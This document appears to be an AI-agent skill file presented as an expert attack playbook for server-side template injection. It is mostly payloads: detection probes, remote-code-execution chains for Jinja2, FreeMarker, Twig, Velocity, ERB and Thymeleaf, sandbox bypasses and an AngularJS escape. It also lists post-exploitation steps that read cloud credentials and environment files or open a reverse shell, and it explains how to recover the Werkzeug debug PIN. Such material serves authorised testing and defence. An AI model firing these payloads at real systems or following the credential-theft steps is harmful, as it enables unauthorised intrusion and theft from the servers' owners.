---
name: ssti-server-side-template-injection
description: >-
  SSTI playbook. Use when template expressions, server-side rendering, preview features, or templating engines may evaluate attacker-controlled content.
---

# SKILL: Server-Side Template Injection (SSTI) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSTI techniques. Covers polyglot detection probes, engine fingerprinting, Jinja2/FreeMarker/Twig/ERB RCE chains, client-side Angular SSTI, and bypass techniques. For PHP CMS template eval, Jira SSTI, Confluence OGNL, and Spring Cloud Gateway SpEL, load [SCENARIOS.md](./SCENARIOS.md). For extended engine payloads, see [ENGINE_PAYLOADS.md](./ENGINE_PAYLOADS.md).

## 0. RELATED ROUTING

- [expression-language-injection](../expression-language-injection/SKILL.md) when `${7*7}` resolves in Java (SpEL/OGNL)

---

## 1. DETECTION — POLYGLOT PROBE SEQUENCE

```
{{7*7}}        → 49 = Jinja2 or Twig
${7*7}         → 49 = FreeMarker, Velocity, or Java EL
#{7*7}         → Ruby (ERB)
<#assign x=7*7>${x}  → FreeMarker
@{7*7}         → Thymeleaf
*{7*7}         → Thymeleaf SpEL
```

**Jinja2 vs Twig**: `{{7*'7'}}` → `7777777` = Jinja2, `49` = Twig

**Safe detection**: `{{''.__class__}}` → `class 'str'` = Python/Jinja2

---

## 2. ENGINE-TO-LANGUAGE MAPPING

| Template Engine | Language | Framework |
|---|---|---|
| Jinja2 | Python | Flask, FastAPI |
| Twig | PHP | Symfony, Laravel |
| FreeMarker | Java | Spring MVC |
| Velocity | Java | Various |
| Thymeleaf | Java | Spring Boot |
| ERB | Ruby | Rails |
| Handlebars | Node.js | Express |

---

## 3. JINJA2 (PYTHON FLASK) — RCE CHAINS

```python
# Chain 1: os module via __globals__
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Chain 2: MRO subclass traversal
{{''.__class__.__mro__[1].__subclasses__()}}  # list all, find Popen index
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}

# Chain 3: request object (when config blocked)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Chain 4: lipsum globals
{{lipsum.__globals__.os.popen('id').read()}}

# Chain 5: cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Find correct Popen index dynamically:
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in c.__name__ %}{{loop.index}}{% endif %}
{% endfor %}
```

---

## 4. JINJA2 SANDBOX BYPASS

```python
# _ blocked: use attr with hex
''|attr('\x5f\x5fclass\x5f\x5f')

# . blocked: use [] subscript
''['__class__']

# keywords blocked: hex in attr()
|attr('\x5f\x5fclass\x5f\x5f')
|attr('\x5f\x5fm\x72\x6F\x5f\x5f')

# HTML encoding issues: use |safe filter
```

---

## 5. FREEMARKER (JAVA) — RCE

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

---

## 6. TWIG (PHP) — RCE

```php
// Twig 1.x:
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Twig 2.x:
{{['id']|map('system')|join}}
```

---

## 7. VELOCITY (JAVA) — RCE

```velocity
#set($class=$currentNode.getClass())
#set($rt=$class.forName("java.lang.Runtime"))
#set($proc=$rt.getMethod("exec",$class.forName("java.lang.String")).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
```

---

## 8. ERB (RUBY) — RCE

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
```

---

## 9. THYMELEAF (JAVA SPRING) — RCE

```java
__${T(java.lang.Runtime).getRuntime().exec("id")}__::type
__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream())}__::type
```

---

## 10. CLIENT-SIDE TEMPLATE INJECTION (AngularJS)

```javascript
// AngularJS 1.x sandbox escape:
{{constructor.constructor('alert(1)')()}}
```

Detection: send `{{1+1}}` — if page shows `2`, AngularJS evaluates in DOM.

---

## 11. SSTI → FULL RCE PATH

```
SSTI detected → identify engine
├── Jinja2 → config.__globals__['os'].popen() OR subclass traversal
├── FreeMarker → freemarker.template.utility.Execute?new()
├── Twig → _self.env.registerUndefinedFilterCallback('exec')
├── Velocity → java.lang.Runtime.exec()
├── ERB → <%= `cmd` %>
├── Thymeleaf → T(java.lang.Runtime).getRuntime().exec()
└── AngularJS CSTI → constructor.constructor('payload')()
```

Post-RCE: read `/proc/self/environ`, app config files, `~/.aws/credentials`, reverse shell.

---

## 12. COMMON INJECTION ENTRY POINTS

- URL path / query parameters
- HTML forms (profile name, bio, content)
- Error pages: `404 Not Found: /PAYLOAD`
- Email templates (password reset name field)
- `render_template_string(user_input)` in Flask — most dangerous

---

## 13. UNIVERSAL DETECTION PAYLOADS

```
${{<%[%'"}}%\.     # polyglot that triggers errors in many engines

{{7*7}}     → 49 (Jinja2, Twig, Nunjucks, Handlebars)
${7*7}      → 49 (FreeMarker, Velocity, EL, Thymeleaf)
<%= 7*7 %>  → 49 (ERB, EJS)
@(7*7)      → 49 (Razor)
{7*7}       → 49 (Smarty)
(1/0).zxy.zxy  # error-based engine fingerprint
```

---

## 14. BLIND SSTI TECHNIQUES

- **Boolean-based**: `(3*4/2)` resolves vs `3*)2(/4` errors
- **Time-based**: `{{sleep(5)}}` or engine-specific delay
- **OOB**: DNS/HTTP callback via template expressions
- **Error-based**: force different error messages on true/false

---

## 15. FLASK PIN CALCULATION

Werkzeug debug PIN is derived from: username (`/etc/passwd`), module name, app path, MAC address (`/sys/class/net/eth0/address` → decimal), machine ID (`/etc/machine-id` or `/proc/sys/kernel/random/boot_id` + first line of `/proc/self/cgroup`).

Use established open-source PIN calculators implementing the Werkzeug algorithm.
